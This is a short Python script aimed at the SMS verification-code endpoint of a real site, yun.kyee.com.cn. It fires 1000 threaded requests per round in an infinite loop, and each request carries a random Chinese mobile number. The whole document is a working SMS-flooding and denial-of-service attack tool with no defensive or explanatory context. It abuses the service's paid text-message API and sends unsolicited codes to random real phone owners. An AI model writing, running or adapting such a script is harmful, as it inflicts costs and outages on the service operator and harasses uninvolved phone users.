import random
import string
import threading
import requests

url = "https://yun.kyee.com.cn/auth_server/AccreditController/sendSmsCode.next"

headers = {
    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
    'Connection': 'keep-alive',
    'origin': "https://yun.kyee.com.cn",
    'referer': "https://yun.kyee.com.cn/system/choose_product.next?code=YUNHRP",
    'X-Requested-With': "XMLHttpRequest",
    'Accept': "*/*",
    'Content-Length': "25",
    'content-type': "application/x-www-form-urlencoded; charset=UTF-8"
}


def requestApi():
    fields = {
        'telephone': str(randomName()),
        '123': 123
    },
    try:
        requests.post(url=url, data=fields, headers=headers)
    except Exception as e:
        e


def randomName():
    start = random.choice(['135', '136', '137', '139', '186', '183'])  # 存放前3位的号段，从中随机取一个
    end = ''.join(random.sample(string.digits, 8))
    return start + end


def threadSend():
    threads = []
    for t in range(1000):
        threads.append(threading.Thread(target=requestApi, args=()))
    for thr in threads:
        thr.start()
    for thr in threads:
        thr.join()


if __name__ == '__main__':
    i = 0
    while True:
        threadSend()
        i = i + 1
        print(i)
